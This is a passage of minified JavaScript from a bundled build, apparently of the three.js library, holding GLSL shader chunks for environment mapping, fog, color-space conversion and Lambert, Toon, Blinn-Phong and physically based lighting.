		mipInt = max( mipInt, cubeUV_minMipLevel );
		float faceSize = exp2( mipInt );
		highp vec2 uv = getUV( direction, face ) * ( faceSize - 2.0 ) + 1.0;
		if ( face > 2.0 ) {
			uv.y += faceSize;
			face -= 3.0;
		}
		uv.x += face * faceSize;
		uv.x += filterInt * 3.0 * cubeUV_minTileSize;
		uv.y += 4.0 * ( exp2( CUBEUV_MAX_MIP ) - faceSize );
		uv.x *= CUBEUV_TEXEL_WIDTH;
		uv.y *= CUBEUV_TEXEL_HEIGHT;
		#ifdef texture2DGradEXT
			return texture2DGradEXT( envMap, uv, vec2( 0.0 ), vec2( 0.0 ) ).rgb;
		#else
			return texture2D( envMap, uv ).rgb;
		#endif
	}
	#define cubeUV_r0 1.0
	#define cubeUV_m0 - 2.0
	#define cubeUV_r1 0.8
	#define cubeUV_m1 - 1.0
	#define cubeUV_r4 0.4
	#define cubeUV_m4 2.0
	#define cubeUV_r5 0.305
	#define cubeUV_m5 3.0
	#define cubeUV_r6 0.21
	#define cubeUV_m6 4.0
	float roughnessToMip( float roughness ) {
		float mip = 0.0;
		if ( roughness >= cubeUV_r1 ) {
			mip = ( cubeUV_r0 - roughness ) * ( cubeUV_m1 - cubeUV_m0 ) / ( cubeUV_r0 - cubeUV_r1 ) + cubeUV_m0;
		} else if ( roughness >= cubeUV_r4 ) {
			mip = ( cubeUV_r1 - roughness ) * ( cubeUV_m4 - cubeUV_m1 ) / ( cubeUV_r1 - cubeUV_r4 ) + cubeUV_m1;
		} else if ( roughness >= cubeUV_r5 ) {
			mip = ( cubeUV_r4 - roughness ) * ( cubeUV_m5 - cubeUV_m4 ) / ( cubeUV_r4 - cubeUV_r5 ) + cubeUV_m4;
		} else if ( roughness >= cubeUV_r6 ) {
			mip = ( cubeUV_r5 - roughness ) * ( cubeUV_m6 - cubeUV_m5 ) / ( cubeUV_r5 - cubeUV_r6 ) + cubeUV_m5;
		} else {
			mip = - 2.0 * log2( 1.16 * roughness );		}
		return mip;
	}
	vec4 textureCubeUV( sampler2D envMap, vec3 sampleDir, float roughness ) {
		float mip = clamp( roughnessToMip( roughness ), cubeUV_m0, CUBEUV_MAX_MIP );
		float mipF = fract( mip );
		float mipInt = floor( mip );
		vec3 color0 = bilinearCubeUV( envMap, sampleDir, mipInt );
		if ( mipF == 0.0 ) {
			return vec4( color0, 1.0 );
		} else {
			vec3 color1 = bilinearCubeUV( envMap, sampleDir, mipInt + 1.0 );
			return vec4( mix( color0, color1, mipF ), 1.0 );
		}
	}
#endif`,LM=`vec3 transformedNormal = objectNormal;
#ifdef USE_TANGENT
	vec3 transformedTangent = objectTangent;
#endif
#ifdef USE_BATCHING
	mat3 bm = mat3( batchingMatrix );
	transformedNormal /= vec3( dot( bm[ 0 ], bm[ 0 ] ), dot( bm[ 1 ], bm[ 1 ] ), dot( bm[ 2 ], bm[ 2 ] ) );
	transformedNormal = bm * transformedNormal;
	#ifdef USE_TANGENT
		transformedTangent = bm * transformedTangent;
	#endif
#endif
#ifdef USE_INSTANCING
	mat3 im = mat3( instanceMatrix );
	transformedNormal /= vec3( dot( im[ 0 ], im[ 0 ] ), dot( im[ 1 ], im[ 1 ] ), dot( im[ 2 ], im[ 2 ] ) );
	transformedNormal = im * transformedNormal;
	#ifdef USE_TANGENT
		transformedTangent = im * transformedTangent;
	#endif
#endif
transformedNormal = normalMatrix * transformedNormal;
#ifdef FLIP_SIDED
	transformedNormal = - transformedNormal;
#endif
#ifdef USE_TANGENT
	transformedTangent = ( modelViewMatrix * vec4( transformedTangent, 0.0 ) ).xyz;
	#ifdef FLIP_SIDED
		transformedTangent = - transformedTangent;
	#endif
#endif`,kM=`#ifdef USE_DISPLACEMENTMAP
	uniform sampler2D displacementMap;
	uniform float displacementScale;
	uniform float displacementBias;
#endif`,NM=`#ifdef USE_DISPLACEMENTMAP
	transformed += normalize( objectNormal ) * ( texture2D( displacementMap, vDisplacementMapUv ).x * displacementScale + displacementBias );
#endif`,DM=`#ifdef USE_EMISSIVEMAP
	vec4 emissiveColor = texture2D( emissiveMap, vEmissiveMapUv );
	#ifdef DECODE_VIDEO_TEXTURE_EMISSIVE
		emissiveColor = sRGBTransferEOTF( emissiveColor );
	#endif
	totalEmissiveRadiance *= emissiveColor.rgb;
#endif`,IM=`#ifdef USE_EMISSIVEMAP
	uniform sampler2D emissiveMap;
#endif`,UM="gl_FragColor = linearToOutputTexel( gl_FragColor );",OM=`vec4 LinearTransferOETF( in vec4 value ) {
	return value;
}
vec4 sRGBTransferEOTF( in vec4 value ) {
	return vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.a );
}
vec4 sRGBTransferOETF( in vec4 value ) {
	return vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.a );
}`,FM=`#ifdef USE_ENVMAP
	#ifdef ENV_WORLDPOS
		vec3 cameraToFrag;
		if ( isOrthographic ) {
			cameraToFrag = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );
		} else {
			cameraToFrag = normalize( vWorldPosition - cameraPosition );
		}
		vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );
		#ifdef ENVMAP_MODE_REFLECTION
			vec3 reflectVec = reflect( cameraToFrag, worldNormal );
		#else
			vec3 reflectVec = refract( cameraToFrag, worldNormal, refractionRatio );
		#endif
	#else
		vec3 reflectVec = vReflect;
	#endif
	#ifdef ENVMAP_TYPE_CUBE
		vec4 envColor = textureCube( envMap, envMapRotation * vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );
	#else
		vec4 envColor = vec4( 0.0 );
	#endif
	#ifdef ENVMAP_BLENDING_MULTIPLY
		outgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );
	#elif defined( ENVMAP_BLENDING_MIX )
		outgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );
	#elif defined( ENVMAP_BLENDING_ADD )
		outgoingLight += envColor.xyz * specularStrength * reflectivity;
	#endif
#endif`,BM=`#ifdef USE_ENVMAP
	uniform float envMapIntensity;
	uniform float flipEnvMap;
	uniform mat3 envMapRotation;
	#ifdef ENVMAP_TYPE_CUBE
		uniform samplerCube envMap;
	#else
		uniform sampler2D envMap;
	#endif
#endif`,zM=`#ifdef USE_ENVMAP
	uniform float reflectivity;
	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( LAMBERT )
		#define ENV_WORLDPOS
	#endif
	#ifdef ENV_WORLDPOS
		varying vec3 vWorldPosition;
		uniform float refractionRatio;
	#else
		varying vec3 vReflect;
	#endif
#endif`,VM=`#ifdef USE_ENVMAP
	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( LAMBERT )
		#define ENV_WORLDPOS
	#endif
	#ifdef ENV_WORLDPOS
		
		varying vec3 vWorldPosition;
	#else
		varying vec3 vReflect;
		uniform float refractionRatio;
	#endif
#endif`,HM=`#ifdef USE_ENVMAP
	#ifdef ENV_WORLDPOS
		vWorldPosition = worldPosition.xyz;
	#else
		vec3 cameraToVertex;
		if ( isOrthographic ) {
			cameraToVertex = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );
		} else {
			cameraToVertex = normalize( worldPosition.xyz - cameraPosition );
		}
		vec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );
		#ifdef ENVMAP_MODE_REFLECTION
			vReflect = reflect( cameraToVertex, worldNormal );
		#else
			vReflect = refract( cameraToVertex, worldNormal, refractionRatio );
		#endif
	#endif
#endif`,GM=`#ifdef USE_FOG
	vFogDepth = - mvPosition.z;
#endif`,WM=`#ifdef USE_FOG
	varying float vFogDepth;
#endif`,jM=`#ifdef USE_FOG
	#ifdef FOG_EXP2
		float fogFactor = 1.0 - exp( - fogDensity * fogDensity * vFogDepth * vFogDepth );
	#else
		float fogFactor = smoothstep( fogNear, fogFar, vFogDepth );
	#endif
	gl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );
#endif`,XM=`#ifdef USE_FOG
	uniform vec3 fogColor;
	varying float vFogDepth;
	#ifdef FOG_EXP2
		uniform float fogDensity;
	#else
		uniform float fogNear;
		uniform float fogFar;
	#endif
#endif`,qM=`#ifdef USE_GRADIENTMAP
	uniform sampler2D gradientMap;
#endif
vec3 getGradientIrradiance( vec3 normal, vec3 lightDirection ) {
	float dotNL = dot( normal, lightDirection );
	vec2 coord = vec2( dotNL * 0.5 + 0.5, 0.0 );
	#ifdef USE_GRADIENTMAP
		return vec3( texture2D( gradientMap, coord ).r );
	#else
		vec2 fw = fwidth( coord ) * 0.5;
		return mix( vec3( 0.7 ), vec3( 1.0 ), smoothstep( 0.7 - fw.x, 0.7 + fw.x, coord.x ) );
	#endif
}`,YM=`#ifdef USE_LIGHTMAP
	uniform sampler2D lightMap;
	uniform float lightMapIntensity;
#endif`,$M=`LambertMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.specularStrength = specularStrength;`,KM=`varying vec3 vViewPosition;
struct LambertMaterial {
	vec3 diffuseColor;
	float specularStrength;
};
void RE_Direct_Lambert( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in LambertMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectDiffuse_Lambert( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in LambertMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_Lambert
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Lambert`,ZM=`uniform bool receiveShadow;
uniform vec3 ambientLightColor;
#if defined( USE_LIGHT_PROBES )
	uniform vec3 lightProbe[ 9 ];
#endif
vec3 shGetIrradianceAt( in vec3 normal, in vec3 shCoefficients[ 9 ] ) {
	float x = normal.x, y = normal.y, z = normal.z;
	vec3 result = shCoefficients[ 0 ] * 0.886227;
	result += shCoefficients[ 1 ] * 2.0 * 0.511664 * y;
	result += shCoefficients[ 2 ] * 2.0 * 0.511664 * z;
	result += shCoefficients[ 3 ] * 2.0 * 0.511664 * x;
	result += shCoefficients[ 4 ] * 2.0 * 0.429043 * x * y;
	result += shCoefficients[ 5 ] * 2.0 * 0.429043 * y * z;
	result += shCoefficients[ 6 ] * ( 0.743125 * z * z - 0.247708 );
	result += shCoefficients[ 7 ] * 2.0 * 0.429043 * x * z;
	result += shCoefficients[ 8 ] * 0.429043 * ( x * x - y * y );
	return result;
}
vec3 getLightProbeIrradiance( const in vec3 lightProbe[ 9 ], const in vec3 normal ) {
	vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );
	vec3 irradiance = shGetIrradianceAt( worldNormal, lightProbe );
	return irradiance;
}
vec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {
	vec3 irradiance = ambientLightColor;
	return irradiance;
}
float getDistanceAttenuation( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {
	float distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );
	if ( cutoffDistance > 0.0 ) {
		distanceFalloff *= pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );
	}
	return distanceFalloff;
}
float getSpotAttenuation( const in float coneCosine, const in float penumbraCosine, const in float angleCosine ) {
	return smoothstep( coneCosine, penumbraCosine, angleCosine );
}
#if NUM_DIR_LIGHTS > 0
	struct DirectionalLight {
		vec3 direction;
		vec3 color;
	};
	uniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];
	void getDirectionalLightInfo( const in DirectionalLight directionalLight, out IncidentLight light ) {
		light.color = directionalLight.color;
		light.direction = directionalLight.direction;
		light.visible = true;
	}
#endif
#if NUM_POINT_LIGHTS > 0
	struct PointLight {
		vec3 position;
		vec3 color;
		float distance;
		float decay;
	};
	uniform PointLight pointLights[ NUM_POINT_LIGHTS ];
	void getPointLightInfo( const in PointLight pointLight, const in vec3 geometryPosition, out IncidentLight light ) {
		vec3 lVector = pointLight.position - geometryPosition;
		light.direction = normalize( lVector );
		float lightDistance = length( lVector );
		light.color = pointLight.color;
		light.color *= getDistanceAttenuation( lightDistance, pointLight.distance, pointLight.decay );
		light.visible = ( light.color != vec3( 0.0 ) );
	}
#endif
#if NUM_SPOT_LIGHTS > 0
	struct SpotLight {
		vec3 position;
		vec3 direction;
		vec3 color;
		float distance;
		float decay;
		float coneCos;
		float penumbraCos;
	};
	uniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];
	void getSpotLightInfo( const in SpotLight spotLight, const in vec3 geometryPosition, out IncidentLight light ) {
		vec3 lVector = spotLight.position - geometryPosition;
		light.direction = normalize( lVector );
		float angleCos = dot( light.direction, spotLight.direction );
		float spotAttenuation = getSpotAttenuation( spotLight.coneCos, spotLight.penumbraCos, angleCos );
		if ( spotAttenuation > 0.0 ) {
			float lightDistance = length( lVector );
			light.color = spotLight.color * spotAttenuation;
			light.color *= getDistanceAttenuation( lightDistance, spotLight.distance, spotLight.decay );
			light.visible = ( light.color != vec3( 0.0 ) );
		} else {
			light.color = vec3( 0.0 );
			light.visible = false;
		}
	}
#endif
#if NUM_RECT_AREA_LIGHTS > 0
	struct RectAreaLight {
		vec3 color;
		vec3 position;
		vec3 halfWidth;
		vec3 halfHeight;
	};
	uniform sampler2D ltc_1;	uniform sampler2D ltc_2;
	uniform RectAreaLight rectAreaLights[ NUM_RECT_AREA_LIGHTS ];
#endif
#if NUM_HEMI_LIGHTS > 0
	struct HemisphereLight {
		vec3 direction;
		vec3 skyColor;
		vec3 groundColor;
	};
	uniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];
	vec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in vec3 normal ) {
		float dotNL = dot( normal, hemiLight.direction );
		float hemiDiffuseWeight = 0.5 * dotNL + 0.5;
		vec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );
		return irradiance;
	}
#endif`,JM=`#ifdef USE_ENVMAP
	vec3 getIBLIrradiance( const in vec3 normal ) {
		#ifdef ENVMAP_TYPE_CUBE_UV
			vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );
			vec4 envMapColor = textureCubeUV( envMap, envMapRotation * worldNormal, 1.0 );
			return PI * envMapColor.rgb * envMapIntensity;
		#else
			return vec3( 0.0 );
		#endif
	}
	vec3 getIBLRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness ) {
		#ifdef ENVMAP_TYPE_CUBE_UV
			vec3 reflectVec = reflect( - viewDir, normal );
			reflectVec = normalize( mix( reflectVec, normal, pow4( roughness ) ) );
			reflectVec = inverseTransformDirection( reflectVec, viewMatrix );
			vec4 envMapColor = textureCubeUV( envMap, envMapRotation * reflectVec, roughness );
			return envMapColor.rgb * envMapIntensity;
		#else
			return vec3( 0.0 );
		#endif
	}
	#ifdef USE_ANISOTROPY
		vec3 getIBLAnisotropyRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness, const in vec3 bitangent, const in float anisotropy ) {
			#ifdef ENVMAP_TYPE_CUBE_UV
				vec3 bentNormal = cross( bitangent, viewDir );
				bentNormal = normalize( cross( bentNormal, bitangent ) );
				bentNormal = normalize( mix( bentNormal, normal, pow2( pow2( 1.0 - anisotropy * ( 1.0 - roughness ) ) ) ) );
				return getIBLRadiance( viewDir, bentNormal, roughness );
			#else
				return vec3( 0.0 );
			#endif
		}
	#endif
#endif`,QM=`ToonMaterial material;
material.diffuseColor = diffuseColor.rgb;`,eE=`varying vec3 vViewPosition;
struct ToonMaterial {
	vec3 diffuseColor;
};
void RE_Direct_Toon( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {
	vec3 irradiance = getGradientIrradiance( geometryNormal, directLight.direction ) * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectDiffuse_Toon( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_Toon
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Toon`,tE=`BlinnPhongMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.specularColor = specular;
material.specularShininess = shininess;
material.specularStrength = specularStrength;`,nE=`varying vec3 vViewPosition;
struct BlinnPhongMaterial {
	vec3 diffuseColor;
	vec3 specularColor;
	float specularShininess;
	float specularStrength;
};
void RE_Direct_BlinnPhong( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
	reflectedLight.directSpecular += irradiance * BRDF_BlinnPhong( directLight.direction, geometryViewDir, geometryNormal, material.specularColor, material.specularShininess ) * material.specularStrength;
}
void RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_BlinnPhong
#define RE_IndirectDiffuse		RE_IndirectDiffuse_BlinnPhong`,iE=`PhysicalMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.diffuseContribution = diffuseColor.rgb * ( 1.0 - metalnessFactor );
material.metalness = metalnessFactor;
vec3 dxy = max( abs( dFdx( nonPerturbedNormal ) ), abs( dFdy( nonPerturbedNormal ) ) );
float geometryRoughness = max( max( dxy.x, dxy.y ), dxy.z );
material.roughness = max( roughnessFactor, 0.0525 );material.roughness += geometryRoughness;
material.roughness = min( material.roughness, 1.0 );
#ifdef IOR
	material.ior = ior;
	#ifdef USE_SPECULAR
		float specularIntensityFactor = specularIntensity;
		vec3 specularColorFactor = specularColor;
		#ifdef USE_SPECULAR_COLORMAP
			specularColorFactor *= texture2D( specularColorMap, vSpecularColorMapUv ).rgb;
		#endif
		#ifdef USE_SPECULAR_INTENSITYMAP
			specularIntensityFactor *= texture2D( specularIntensityMap, vSpecularIntensityMapUv ).a;
		#endif
		material.specularF90 = mix( specularIntensityFactor, 1.0, metalnessFactor );
	#else
		float specularIntensityFactor = 1.0;
		vec3 specularColorFactor = vec3( 1.0 );
		material.specularF90 = 1.0;
	#endif
	material.specularColor = min( pow2( ( material.ior - 1.0 ) / ( material.ior + 1.0 ) ) * specularColorFactor, vec3( 1.0 ) ) * specularIntensityFactor;
	material.specularColorBlended = mix( material.specularColor, diffuseColor.rgb, metalnessFactor );
#else
	material.specularColor = vec3( 0.04 );
	material.specularColorBlended = mix( material.specularColor, diffuseColor.rgb, metalnessFactor );
	material.specularF90 = 1.0;
#endif
#ifdef USE_CLEARCOAT
	material.clearcoat = clearcoat;
	material.clearcoatRoughness = clearcoatRoughness;
	material.clearcoatF0 = vec3( 0.04 );
	material.clearcoatF90 = 1.0;
	#ifdef USE_CLEARCOATMAP
		material.clearcoat *= texture2D( clearcoatMap, vClearcoatMapUv ).x;
	#endif
	#ifdef USE_CLEARCOAT_ROUGHNESSMAP
		material.clearcoatRoughness *= texture2D( clearcoatRoughnessMap, vClearcoatRoughnessMapUv ).y;
	#endif
	material.clearcoat = saturate( material.clearcoat );	material.clearcoatRoughness = max( material.clearcoatRoughness, 0.0525 );
	material.clearcoatRoughness += geometryRoughness;
	material.clearcoatRoughness = min( material.clearcoatRoughness, 1.0 );
#endif
#ifdef USE_DISPERSION
	material.dispersion = dispersion;
#endif
#ifdef USE_IRIDESCENCE
	material.iridescence = iridescence;
	material.iridescenceIOR = iridescenceIOR;
	#ifdef USE_IRIDESCENCEMAP
		material.iridescence *= texture2D( iridescenceMap, vIridescenceMapUv ).r;
	#endif
	#ifdef USE_IRIDESCENCE_THICKNESSMAP
		material.iridescenceThickness = (iridescenceThicknessMaximum - iridescenceThicknessMinimum) * texture2D( iridescenceThicknessMap, vIridescenceThicknessMapUv ).g + iridescenceThicknessMinimum;
	#else
		material.iridescenceThickness = iridescenceThicknessMaximum;
	#endif
#endif
#ifdef USE_SHEEN
	material.sheenColor = sheenColor;
	#ifdef USE_SHEEN_COLORMAP
		material.sheenColor *= texture2D( sheenColorMap, vSheenColorMapUv ).rgb;
	#endif
	material.sheenRoughness = clamp( sheenRoughness, 0.0001, 1.0 );
	#ifdef USE_SHEEN_ROUGHNESSMAP
		material.sheenRoughness *= texture2D( sheenRoughnessMap, vSheenRoughnessMapUv ).a;
	#endif
#endif
#ifdef USE_ANISOTROPY
	#ifdef USE_ANISOTROPYMAP
		mat2 anisotropyMat = mat2( anisotropyVector.x, anisotropyVector.y, - anisotropyVector.y, anisotropyVector.x );
		vec3 anisotropyPolar = texture2D( anisotropyMap, vAnisotropyMapUv ).rgb;
		vec2 anisotropyV = anisotropyMat * normalize( 2.0 * anisotropyPolar.rg - vec2( 1.0 ) ) * anisotropyPolar.b;
	#else
		vec2 anisotropyV = anisotropyVector;
	#endif
	material.anisotropy = length( anisotropyV );
	if( material.anisotropy == 0.0 ) {
		anisotropyV = vec2( 1.0, 0.0 );
	} else {
		anisotropyV /= material.anisotropy;
		material.anisotropy = saturate( material.anisotropy );
	}
	material.alphaT = mix( pow2( material.roughness ), 1.0, pow2( material.anisotropy ) );
	material.anisotropyT = tbn[ 0 ] * anisotropyV.x + tbn[ 1 ] * anisotropyV.y;
	material.anisotropyB = tbn[ 1 ] * anisotropyV.x - tbn[ 0 ] * anisotropyV.y;
#endif`,sE=`uniform sampler2D dfgLUT;
struct PhysicalMaterial {
	vec3 diffuseColor;
	vec3 diffuseContribution;
	vec3 specularColor;
	vec3 specularColorBlended;
	float roughness;
	float metalness;
	float specularF90;
	float dispersion;
	#ifdef USE_CLEARCOAT
		float clearcoat;
		float clearcoatRoughness;
		vec3 clearcoatF0;
		float clearcoatF90;
	#endif
	#ifdef USE_IRIDESCENCE
		float iridescence;
		float iridescenceIOR;
		float iridescenceThickness;
		vec3 iridescenceFresnel;
		vec3 iridescenceF0;
		vec3 iridescenceFresnelDielectric;
		vec3 iridescenceFresnelMetallic;
	#endif
	#ifdef USE_SHEEN
		vec3 sheenColor;
		float sheenRoughness;
	#endif
	#ifdef IOR
		float ior;
	#endif
	#ifdef USE_TRANSMISSION
		float transmission;
		float transmissionAlpha;
		float thickness;
		float attenuationDistance;
		vec3 attenuationColor;
	#endif
	#ifdef USE_ANISOTROPY
		float anisotropy;
		float alphaT;
		vec3 anisotropyT;
		vec3 anisotropyB;
	#endif
};
vec3 clearcoatSpecularDirect = vec3( 0.0 );
vec3 clearcoatSpecularIndirect = vec3( 0.0 );
vec3 sheenSpecularDirect = vec3( 0.0 );
vec3 sheenSpecularIndirect = vec3(0.0 );
vec3 Schlick_to_F0( const in vec3 f, const in float f90, const in float dotVH ) {
    float x = clamp( 1.0 - dotVH, 0.0, 1.0 );
    float x2 = x * x;
    float x5 = clamp( x * x2 * x2, 0.0, 0.9999 );
    return ( f - vec3( f90 ) * x5 ) / ( 1.0 - x5 );
}
float V_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {
	float a2 = pow2( alpha );
	float gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );
	float gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );
	return 0.5 / max( gv + gl, EPSILON );
}
float D_GGX( const in float alpha, const in float dotNH ) {
	float a2 = pow2( alpha );
	float denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;
	return RECIPROCAL_PI * a2 / pow2( denom );
}
#ifdef USE_ANISOTROPY
	float V_GGX_SmithCorrelated_Anisotropic( const in float alphaT, const in float alphaB, const in float dotTV, const in float dotBV, const in float dotTL, const in float dotBL, const in float dotNV, const in float dotNL ) {
		float gv = dotNL * length( vec3( alphaT * dotTV, alphaB * dotBV, dotNV ) );
		float gl = dotNV * length( vec3( alphaT * dotTL, alphaB * dotBL, dotNL ) );
		float v = 0.5 / ( gv + gl );
		return v;
	}
	float D_GGX_Anisotropic( const in float alphaT, const in float alphaB, const in float dotNH, const in float dotTH, const in float dotBH ) {
		float a2 = alphaT * alphaB;
		highp vec3 v = vec3( alphaB * dotTH, alphaT * dotBH, a2 * dotNH );
		highp float v2 = dot( v, v );
		float w2 = a2 / v2;
		return RECIPROCAL_PI * a2 * pow2 ( w2 );
	}
#endif
#ifdef USE_CLEARCOAT
	vec3 BRDF_GGX_Clearcoat( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in PhysicalMaterial material) {
		vec3 f0 = material.clearcoatF0;
		float f90 = material.clearcoatF90;
		float roughness = material.clearcoatRoughness;
		float alpha = pow2( roughness );
		vec3 halfDir = normalize( lightDir + viewDir );
		float dotNL = saturate( dot( normal, lightDir ) );
		float dotNV = saturate( dot( normal, viewDir ) );
		float dotNH = saturate( dot( normal, halfDir ) );
		float dotVH = saturate( dot( viewDir, halfDir ) );
		vec3 F = F_Schlick( f0, f90, dotVH );
		float V = V_GGX_SmithCorrelated( alpha, dotNL, dotNV );
		float D = D_GGX( alpha, dotNH );
		return F * ( V * D );
	}
#endif
vec3 BRDF_GGX( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in PhysicalMaterial material ) {
	vec3 f0 = material.specularColorBlended;
	float f90 = material.specularF90;
	float roughness = material.roughness;
	float alpha = pow2( roughness );
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNL = saturate( dot( normal, lightDir ) );
	float dotNV = saturate( dot( normal, viewDir ) );
	float dotNH = saturate( dot( normal, halfDir ) );
	float dotVH = saturate( dot( viewDir, halfDir ) );
	vec3 F = F_Schlick( f0, f90, dotVH );
	#ifdef USE_IRIDESCENCE
		F = mix( F, material.iridescenceFresnel, material.iridescence );
	#endif
	#ifdef USE_ANISOTROPY
		float dotTL = dot( material.anisotropyT, lightDir );
		float dotTV = dot( material.anisotropyT, viewDir );
		float dotTH = dot( material.anisotropyT, halfDir );
		float dotBL = dot( material.anisotropyB, lightDir );
		float dotBV = dot( material.anisotropyB, viewDir );
		float dotBH = dot( material.anisotropyB, halfDir );
		float V = V_GGX_SmithCorrelated_Anisotropic( material.alphaT, alpha, dotTV, dotBV, dotTL, dotBL, dotNV, dotNL );
		float D = D_GGX_Anisotropic( material.alphaT, alpha, dotNH, dotTH, dotBH );
	#else
		float V = V_GGX_SmithCorrelated( alpha, dotNL, dotNV );
		float D = D_GGX( alpha, dotNH );
	#endif
	return F * ( V * D );
}
vec2 LTC_Uv( const in vec3 N, const in vec3 V, const in float roughness ) {
	const float LUT_SIZE = 64.0;
	const float LUT_SCALE = ( LUT_SIZE - 1.0 ) / LUT_SIZE;
	const float LUT_BIAS = 0.5 / LUT_SIZE;
	float dotNV = saturate( dot( N, V ) );
	vec2 uv = vec2( roughness, sqrt( 1.0 - dotNV ) );
	uv = uv * LUT_SCALE + LUT_BIAS;
	return uv;
}
float LTC_ClippedSphereFormFactor( const in vec3 f ) {
	float l = length( f );
	return max( ( l * l + f.z ) / ( l + 1.0 ), 0.0 );
}
vec3 LTC_EdgeVectorFormFactor( const in vec3 v1, const in vec3 v2 ) {
	float x = dot( v1, v2 );
	float y = abs( x );
	float a = 0.8543985 + ( 0.4965155 + 0.0145206 * y ) * y;
	float b = 3.4175940 + ( 4.1616724 + y ) * y;
	float v = a / b;
	float theta_sintheta = ( x > 0.0 ) ? v : 0.5 * inversesqrt( max( 1.0 - x * x, 1e-7 ) ) - v;
	return cross( v1, v2 ) * theta_sintheta;
}
vec3 LTC_Evaluate( const in vec3 N, const in vec3 V, const in vec3 P, const in mat3 mInv, const in vec3 rectCoords[ 4 ] ) {
	vec3 v1 = rectCoords[ 1 ] - rectCoords[ 0 ];
	vec3 v2 = rectCoords[ 3 ] - rectCoords[ 0 ];
	vec3 lightNormal = cross( v1, v2 );
	if( dot( lightNormal, P - rectCoords[ 0 ] ) < 0.0 ) return vec3( 0.0 );
	vec3 T1, T2;
	T1 = normalize( V - N * dot( V, N ) );
	T2 = - cross( N, T1 );
	mat3 mat = mInv * transpose( mat3( T1, T2, N ) );
	vec3 coords[ 4 ];
	coords[ 0 ] = mat * ( rectCoords[ 0 ] - P );
	coords[ 1 ] = mat * ( rectCoords[ 1 ] - P );
	coords[ 2 ] = mat * ( rectCoords[ 2 ] - P );
	coords[ 3 ] = mat * ( rectCoords[ 3 ] - P );
	coords[ 0 ] = normalize( coords[ 0 ] );
